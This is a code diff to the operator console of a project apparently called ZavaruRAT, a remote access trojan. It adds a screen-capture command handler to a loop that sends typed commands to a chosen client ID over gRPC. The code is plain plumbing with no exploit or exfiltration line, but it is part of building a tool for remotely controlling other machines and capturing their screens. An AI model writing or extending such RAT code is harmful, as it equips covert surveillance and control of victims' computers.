@@ -4,6 +4,7 @@ using Google.Protobuf.WellKnownTypes;
 using Grpc.Core;
 using Grpc.Net.Client;
 using MessagePack;
+using ZavaruRAT.Admin.CommandHandlers;
 using ZavaruRAT.Proto;
 
 #endregion
@@ -11,13 +12,20 @@ using ZavaruRAT.Proto;
 var channel = GrpcChannel.ForAddress("https://localhost:5001");
 var adminClient = new AdminHub.AdminHubClient(channel);
 
+var commandHandlers = new List<CommandHandler>
+{
+    new ScreenCapture(adminClient)
+};
+
 while (true)
 {
+    Console.Clear();
+
     Console.Write("Client ID > ");
-    var clientId = Console.ReadLine();
+    var clientId = Console.ReadLine()!;
 
     Console.Write("Command   > ");
-    var command = Console.ReadLine();
+    var command = Console.ReadLine()!;
 
     Console.WriteLine();
 
@@ -34,6 +42,23 @@ while (true)
     });
 
     Console.WriteLine("Waiting for {0} result", hashId);
+
+
+    var handled = false;
+    foreach (var handler in commandHandlers)
+    {
+        if (handler.Match(command.ToLower()))
+        {
+            await handler.Handle(hashId, clientId, results);
+            handled = true;
+            break;
+        }
+    }
+
+    if (handled)
+    {
+        continue;
+    }
 
     await foreach (var commandResult in results.ResponseStream.ReadAllAsync())
     {
